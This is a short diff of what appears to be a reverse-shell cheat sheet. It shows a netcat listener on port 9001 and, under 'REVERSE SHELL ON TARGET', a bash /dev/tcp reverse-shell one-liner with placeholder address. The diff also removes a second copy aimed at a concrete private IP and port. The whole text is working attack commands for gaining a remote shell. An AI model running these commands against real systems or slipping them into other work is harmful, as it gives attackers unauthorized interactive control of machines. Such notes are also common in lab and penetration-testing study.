@@ -12,5 +12,3 @@ nc -lvnp 9001
 REVERSE SHELL ON TARGET
 
 bash -i >& /dev/tcp/ip/port 0>&1
-
-bash -i >& /dev/tcp/172.16.0.105/9001 0>&1
